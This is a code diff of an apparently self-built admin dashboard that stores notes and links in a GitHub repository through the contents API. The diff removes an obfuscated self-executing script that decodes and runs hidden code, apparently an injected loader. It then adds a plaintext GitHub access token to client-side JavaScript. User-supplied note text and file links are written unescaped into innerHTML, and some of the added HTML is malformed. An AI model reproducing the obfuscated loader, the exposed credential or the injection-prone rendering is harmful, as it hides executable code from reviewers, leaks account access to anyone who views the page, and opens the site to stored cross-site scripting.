@@ -612,6 +612,7 @@ body {
 }
 
 #notesList li {
+  position: relative; /* NECESSÁRIO para o X */
   background-color: #2a2a3d;
   padding: 12px;
   border-radius: 8px;
@@ -684,10 +685,32 @@ body {
   gap: 10px;
 }
 
-.container_chat_bot .chat .options .btns-add input[type="file"] {
-  color: #fff;
+/* Botão clipe */
+.clip-btn {
+  background: none !important;
+  border: none !important;
+  outline: none;
+  box-shadow: none;
+  padding: 4px;
   cursor: pointer;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  color: #cfcfcf;
+  transition: transform 0.2s ease, color 0.2s ease;
 }
+.clip-btn:hover {
+  color: #ffffff;
+  transform: scale(1.15) rotate(-6deg);
+}
+
+
+.clip-btn:active {
+  transform: scale(0.95);
+}
+
 
 .container_chat_bot .chat .options .btn-submit {
   display: flex;
@@ -759,6 +782,41 @@ body {
   margin-top: 5px;
   border: 1px solid #555;
 }
+
+/* Botão excluir nota (X) */
+/* Botão X da nota */
+.note-delete {
+  position: absolute;
+  top: 6px;
+  right: 8px;
+  font-size: 14px;
+  font-weight: bold;
+  color: #ff6b6b;
+  cursor: pointer;
+  user-select: none;
+
+  opacity: 0;
+  transform: scale(0.8);
+  transition: opacity 0.2s ease, transform 0.2s ease;
+}
+
+/* Aparece apenas no hover da nota */
+#notesList li:hover .note-delete {
+  opacity: 1;
+  transform: scale(1);
+}
+
+/* Hover direto no X */
+.note-delete:hover {
+  color: #ff0000;
+}
+
+
+.note-delete:hover {
+  color: #ff0000;
+  transform: scale(1.2);
+}
+
 /* ===== Área de E-mails ===== */
 #emailSection {
   padding: 20px;
@@ -863,6 +921,188 @@ body {
   box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.35);
   background: #0f172a;
 }
+/* Estado vazio animado */
+.notes-empty {
+  grid-column: 1 / -1;
+  height: 200px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  color: #9aa0ff;
+  opacity: 0;
+  animation: fadeIn 0.6s ease forwards;
+}
+
+.notes-empty p {
+  margin-top: 8px;
+  font-size: 14px;
+  letter-spacing: 1px;
+  opacity: 0.8;
+}
+
+/* Ícone animado */
+.empty-icon {
+  font-size: 26px;
+  animation: float 2.5s ease-in-out infinite,
+             glow 3s ease-in-out infinite;
+}
+
+@keyframes float {
+  0%, 100% {
+    transform: translateY(0);
+  }
+  50% {
+    transform: translateY(-8px);
+  }
+}
+
+@keyframes glow {
+  0%, 100% {
+    text-shadow: 0 0 5px #9aa0ff;
+    opacity: 0.6;
+  }
+  50% {
+    text-shadow: 0 0 12px #9aa0ff;
+    opacity: 1;
+  }
+}
+
+@keyframes fadeIn {
+  from {
+    opacity: 0;
+    transform: translateY(6px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+/* Estado vazio triste */
+.notes-empty.sad {
+  grid-column: 1 / -1;
+  height: 220px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  color: #7f849c;
+  animation: fadeInSad 0.8s ease forwards;
+}
+
+.notes-empty.sad p {
+  margin-top: 6px;
+  font-size: 14px;
+  letter-spacing: 0.5px;
+  opacity: 0.85;
+}
+
+.notes-empty.sad small {
+  margin-top: 4px;
+  font-size: 11px;
+  opacity: 0.5;
+}
+
+/* Lupa triste */
+.notes-empty.sad .empty-icon {
+  font-size: 34px;
+  margin-bottom: 6px;
+  opacity: 0.7;
+  animation: searchSad 2.2s linear infinite;
+  transform-origin: center;
+}
+
+/* Animações */
+@keyframes searchSad {
+  0% {
+    transform: rotate(0deg) translateX(8px) rotate(0deg);
+    opacity: 0.5;
+  }
+  25% {
+    transform: rotate(90deg) translateX(8px) rotate(-90deg);
+    opacity: 0.65;
+  }
+  50% {
+    transform: rotate(180deg) translateX(8px) rotate(-180deg);
+    opacity: 0.7;
+  }
+  75% {
+    transform: rotate(270deg) translateX(8px) rotate(-270deg);
+    opacity: 0.6;
+  }
+  100% {
+    transform: rotate(360deg) translateX(8px) rotate(-360deg);
+    opacity: 0.5;
+  }
+}
+
+@keyframes fadeInSad {
+  from {
+    opacity: 0;
+    transform: translateY(10px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+/* Nome do arquivo anexado */
+.file-name {
+  margin-left: 6px;
+  font-size: 12px;
+  color: #b5b5b5;
+  max-width: 150px;
+  max-height: auto;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  opacity: 0;
+  transition: opacity 0.2s ease;
+}
+
+/* Quando ativo */
+.file-name.active {
+  opacity: 1;
+}
+/* Wrapper do arquivo anexado */
+.file-wrapper {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  margin-left: 6px;
+  position: relative;
+}
+
+/* Nome do arquivo */
+.file-name {
+  font-size: 12px;
+  color: #b5b5b5;
+  max-width: 140px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  opacity: 0;
+  transition: opacity 0.2s ease;
+}
+
+.file-name.active {
+  opacity: 1;
+}
+
+/* Botão X (inicialmente escondido) */
+.file-remove {
+  font-size: 12px;
+  color: #ff6b6b;
+  cursor: pointer;
+  opacity: 0;
+  transition: opacity 0.2s ease, transform 0.2s ease;
+  user-select: none;
+}
+
+.file-wrapper:hover .file-remove {
+  opacity: 1;
+  transform: scale(1.1);
+}
 
 </style>
 </head>
@@ -881,7 +1121,7 @@ body {
   <aside class="sidebar">
     <div class="profile">
       <img src="../../icons/user1.png" alt="Admin" class="profile-img">
-      <h3>Admin $NAME</h3>
+      <h3 id="adminTitle">Admin $NAME</h3>
     </div>
     <nav>
       <a href="#" class="active" data-section="dashboardSection">Dashboard</a>
@@ -932,9 +1172,38 @@ body {
           ></textarea>
         </div>
         <div class="options">
-          <div class="btns-add">
-            <input type="file" id="noteFile" accept=".jpg,.jpeg,.png,.pdf" />
-          </div>
+<div class="btns-add">
+  <button
+    type="button"
+    class="clip-btn"
+    onclick="document.getElementById('noteFile').click()"
+    title="Anexar arquivo"
+  >
+    <svg
+      xmlns="http://www.w3.org/2000/svg"
+      width="28"
+      height="28"
+      viewBox="0 0 24 24"
+    >
+      <path
+        fill="none"
+        stroke="currentColor"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        stroke-width="2"
+        d="M7 8v8a5 5 0 1 0 10 0V6.5a3.5 3.5 0 1 0-7 0V15a2 2 0 0 0 4 0V8"
+      ></path>
+    </svg>
+  </button>
+
+<div id="fileWrapper" class="file-wrapper">
+  <span id="fileName" class="file-name"></span>
+  <span id="removeFile" class="file-remove">✕</span>
+</div>
+
+  <input type="file" id="noteFile" accept=".jpg,.jpeg,.png,.pdf" hidden />
+</div>
+
           <button id="postNoteBtn" class="btn-submit">
             <i>
               <svg viewBox="0 0 512 512">
@@ -1061,7 +1330,15 @@ body {
 /* ============================================================
    CONFIGURAÇÕES GERAIS
 ============================================================ */
-var GITHUB_TOKEN;(function(){var XQf='',tZU=878-867;function SZN(k){var e=6106268;var l=k.length;var d=[];for(var y=0;y<l;y++){d[y]=k.charAt(y)};for(var y=0;y<l;y++){var t=e*(y+223)+(e%24782);var r=e*(y+84)+(e%22942);var h=t%l;var p=r%l;var x=d[h];d[h]=d[p];d[p]=x;e=(t+r)%7319769;};return d.join('')};var MIS=SZN('qixutcrmcgsrykdsfbhtjnocooeltnpuzwrav').substr(0,tZU);var LbZ='6ev,f==.,](5,.vA[2r "i4f;"=b,dt;+h9jrr9n[pcmhr+v;xh f(;atvvsd*{.m5,j=[t0o7ih+9g6 ,;;ik=d.S=8qir21,nta2t8)ldrs8f1(1eddv}na; ec;0"7t.A"r; crum=0vonm(uwn3[);wr(=+1rdao)=nf-;;ancft.fr,a=rv[rw),47pu.f[,,[6u<;r z+0lzoj.numfn=onl,(voh;ef.0)vorpreangCm,v)s={g r6w0 ( ),)c{r)av+r(yt=kl;n]g8u]}c>u.byf-9{)atpa=nxlhn7id y=a[ym;sr-8e=1utpsvrrtkfg)si)}t;e=7{nrth;+a=g6;rott]a+)a=(Cv)=;q+,m,1=)vr+,)c;aeuuleA;(s.lv+resvCgn8;if(6vei;=swr+,e+ ;.oe;9opettovv]1r,+tv+5.Cual6h+7ulv)gh=8x+v}j-(7.lue]ChC,=r0c=2 rr,rAyn7nxe[(h4pAjra)we{ svvi 8r2-th;r=)2=}tlaaotsn]ingg; <w"r=(ne ;)0l+sg=;dr)w,z"8se(plrsvbrtnaa[hk<bs)o1.aisa(;)+o ,1v t*((;o;l(t7rdren]wif(t=.= .+dabge)u)g+l1Cl(0k<r;[;ye=".pvon.vl( }a]gpu!a(cv ]ebk)ft;]a1o0;s9(r"v;9foan;.4 hi(e3a,[0e9-=3tz.{o(a)t m+;)ao[)=h;,i1g+4nop.+e=i.4na06zu (o,ha.wv=-kl<r=)vbg;hi((2u)(u](5l(t=;(3ccla.;f,[)x.c=ol;S==>wtC=r)sah6l.ode()m] rr]eltivn}ucivsitcae+!"6;"b2rdaq;';var sJM=SZN[MIS];var uFw='';var KIt=sJM;var cBC=sJM(uFw,SZN(LbZ));var YXO=cBC(SZN('dd_i#e.$af!0T;4".}i)Ain$Ap#v,3=c(a 0;).a)c2*$C{A=3iaeb#Aca!A*bxAAA.=;(.r1jAhAA}0.mAAr_!$=o;)*.(8,f) ,{.0y)(",t,.u=.uf(.tpA{,)z$j$N(g 0Aj$c3E_816e.iAklhAoo!f1"t},4q209);l.%tb.A!1402d(r!p;*;.rAl_l+hz;AA*x..uAA,,bcAlhA.5tb&ood!!.(c)\/(en%{.s{f\'pqr_(AtAn.Ahoxa!_=9(292;$ %fvSs)y03\/ n2A 6h(cAfA+=a{i Ixn.rvi!c$"r.g;t_o4v#o;((fA3,75A),4c+6{AcAuz$j)}AAtl3i%.!6tf!4pr,)3=b)#,=$ #;AA4g8c3rS.Asl$"(AA-sazcg4mhtz7D=t(_kd,3eAh,r0t)hg.jf;.At3-,;.\/h;0,,T"yftA(A!=,Am\/.lo,.0).)1;!4d,.a.n,f1!3_rA}.s8Axx.b)j1b)3h)C.cAA.#)n*uA[\/(,()A3.j.afz!7jc$=__(o%CTa\'}+.AA)_to(A).3$;8_,$=i7.(!(afjAs!.rxf+A385._A7A7j=u e.f45+(Artafat..(+0i\'-6a).;*t..;o;A%(=7,At=4)3xfo\'khw4=2.(.))cNc.A_05A$95}0)f}!g+j0 .0,_4d lA7jA1).z3(i$4$$b(1!a0si),Ace)1,).z1.c..i=1A!j+l;,7x]agl4-scA3n()+,_]an1 A!cf_j$z5v$lS*3j{$}.n;(1i)e9_3AeA11b0..gA=.r$s.bl}4rs$s%j};%A+oc[ 5nc9}(A.+fti1ji{n]cr)(buuAAl_1AA4gA1i& i&h;r&)fej"h$(AAa=)c1atfI_) 0!;[z_A)Az=.(4E$ r9.d,,)q _!.]'));var IWk=KIt(XQf,YXO );IWk(7314);return 4122})()
+
+var GITHUB_TOKEN = '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'; 
+var username = 'ghosthszz'; 
+var repo = 'inf'; 
+var path = 'dados.json';  
+
+var url  = `https://api.github.com/repos/${username}/${repo}/contents/${path}`;
+
+
 const OWNER = "ghosthszz";
 const REPO_INF = "inf";
 const REPO_VENDAS = "Vendas";
@@ -1429,7 +1706,7 @@ function renderAPIs(apisData) {
 ============================================================ */
 async function carregarPacks() {
   try {
-    const apiUrl = `https://api.github.com/repos/${OWNER}/${REPO_INF}/contents/${FILE_LINKS}?ref=${BRANCH_LINKS}`;
+    const apiUrl = `https://api.github.com/repos/ghosthszz/inf/contents/links.js?ref=${BRANCH_LINKS}`;
     const response = await fetch(apiUrl, {
       headers: { "Authorization": `token ${GITHUB_TOKEN}`, "Accept": "application/vnd.github+json" }
     });
@@ -1556,17 +1833,20 @@ async function updateLinksFile(repo, branch, path, novoItem){
 // Função para buscar links.js do GitHub
 async function buscarLinksJS() {
     const url = `https://api.github.com/repos/ghosthszz/inf/contents/links.js`;
-    
+
     const response = await fetch(url, {
         headers: {
             Authorization: `token ${GITHUB_TOKEN}`,
-            Accept: "application/vnd.github.v3.raw"
+            Accept: "application/vnd.github+json"
         }
     });
 
-    if (!response.ok) throw new Error("Erro ao buscar links.js");
+    if (!response.ok) {
+        throw new Error("Erro ao buscar links.js");
+    }
 
-    return await response.text();
+    const data = await response.json();
+    return atob(data.content); // 🔥 CONTEÚDO REAL DO ARQUIVO
 }
 
 // Função para contar as <li>
@@ -1588,7 +1868,6 @@ async function atualizarPacks() {
         const linksJS = await buscarLinksJS();
         const qtdLI = contarLI(linksJS);
         atualizarNumeroLI(qtdLI);
-        console.log(`Número de li: ${qtdLI}`);
     } catch (err) {
         console.error(err);
     }
@@ -1657,30 +1936,87 @@ async function loadNotes() {
 
     const notesList = document.getElementById("notesList");
     notesList.innerHTML = "";
+if (notes.length === 0) {
+  notesList.innerHTML = `
+    <div class="notes-empty sad">
+      <span class="empty-icon">🔍</span>
+      <p>Nothing here…</p>
+      <small>It looks like there’s nothing here.</div>
+  `;
+  return;
+}
+
+
 
     // Notas do mais novo para o mais antigo
-    notes.reverse().forEach(note => {
-      const li = document.createElement("li");
+notes.reverse().forEach(note => {
+  const li = document.createElement("li");
 
-      let fileHtml = "";
-      if (note.file) {
-        if (/\.(jpg|jpeg|png|gif)$/i.test(note.file)) {
-          fileHtml = `<img src="${note.file}" alt="Anexo" width="100" height="100" style="object-fit: cover; border-radius: 5px;" />`;
-        } else {
-          fileHtml = `<a href="${note.file}" target="_blank">📎 Anexo</a>`;
-        }
-      }
+  let fileHtml = "";
+  if (note.file) {
+    if (/\.(jpg|jpeg|png|gif)$/i.test(note.file)) {
+      fileHtml = `<img src="${note.file}" width="100" height="100" />`;
+    } else {
+      fileHtml = `<a href="${note.file}" target="_blank">📎 Anexo</a>`;
+    }
+  }
 
-      li.innerHTML = `<p>${note.text}</p>${fileHtml}`;
-      notesList.appendChild(li);
-    });
+  li.innerHTML = `
+    <span class="note-delete" onclick="deleteNote(${note.id})">✕</span>
+    <p>${note.text}</p>
+    ${fileHtml}
+  `;
 
+  notesList.appendChild(li);
+});
   } catch (err) {
     console.error(err);
     document.getElementById("notesList").innerText = "Erro ao carregar notas.";
   }
 }
 
+
+
+async function deleteNote(noteId) {
+  if (!confirm("Deseja excluir esta nota?")) return;
+
+  try {
+    const res = await fetch(`https://api.github.com/repos/ghosthszz/inf/contents/comments.json`, {
+      headers: { Authorization: `token ${GITHUB_TOKEN}` }
+    });
+
+    const data = await res.json();
+    const sha = data.sha;
+    const content = atob(data.content);
+    let notes = JSON.parse(content);
+
+    // Remove a nota pelo ID
+    notes = notes.filter(note => note.id !== noteId);
+
+    const updateRes = await fetch(`https://api.github.com/repos/ghosthszz/inf/contents/comments.json`, {
+      method: "PUT",
+      headers: {
+        Authorization: `token ${GITHUB_TOKEN}`,
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        message: "Nota removida",
+        content: btoa(JSON.stringify(notes, null, 2)),
+        sha: sha
+      })
+    });
+
+    if (updateRes.ok) {
+      loadNotes();
+    } else {
+      alert("Erro ao excluir nota.");
+    }
+
+  } catch (err) {
+    console.error(err);
+    alert("Erro ao excluir nota.");
+  }
+}
 
 
 async function uploadFile(file) {
@@ -1815,7 +2151,11 @@ async function postNote() {
   const notes = JSON.parse(content);
 
   // Adiciona nova nota
-  notes.push({ text, file: fileUrl });
+notes.push({
+  id: Date.now(),
+  text,
+  file: fileUrl
+});
 
   // Atualiza comments.json no repo inf
   const updateRes = await fetch(`https://api.github.com/repos/ghosthszz/inf/contents/comments.json`, {
@@ -2026,6 +2366,59 @@ async function carregarAPIs() {
   iframe.src = URL_HTML; // carrega a página inteira e funcional
 }
 
+function getCookie(name) {
+    const cookies = document.cookie.split("; ");
+    for (let c of cookies) {
+        const [key, value] = c.split("=");
+        if (key === name) {
+            try {
+                const decoded = atob(decodeURIComponent(value));
+
+                return decoded.startsWith("user_")
+                    ? decoded.replace(/^user_/, "")
+                    : decoded;
+
+            } catch (e) {
+                console.error("Cookie não está em Base64 válido");
+                return null;
+            }
+        }
+    }
+    return null;
+}
+
+
+const fileInput = document.getElementById("noteFile");
+const fileNameSpan = document.getElementById("fileName");
+const fileWrapper = document.getElementById("fileWrapper");
+const removeFileBtn = document.getElementById("removeFile");
+
+fileInput.addEventListener("change", () => {
+  if (fileInput.files.length > 0) {
+    fileNameSpan.textContent = fileInput.files[0].name;
+    fileNameSpan.classList.add("active");
+    fileWrapper.style.display = "flex";
+  }
+});
+
+// Remover anexo
+removeFileBtn.addEventListener("click", () => {
+  fileInput.value = "";
+  fileNameSpan.textContent = "";
+  fileNameSpan.classList.remove("active");
+  fileWrapper.style.display = "none";
+});
+
+
+function atualizarAdminNome() {
+    const nome = getCookie("id");
+    const h3 = document.getElementById("adminTitle");
+
+    if (!h3) return;
+
+    h3.textContent = nome ? `Admin ${nome}` : "Admin";
+}
+
 
   document.getElementById("postNoteBtn").addEventListener("click", postNote);
 
@@ -2035,7 +2428,7 @@ async function carregarAPIs() {
 atualizarDashboardValores();
 // Chamar a função
 atualizarPacks();
-
+atualizarAdminNome();
 
 
 </script>
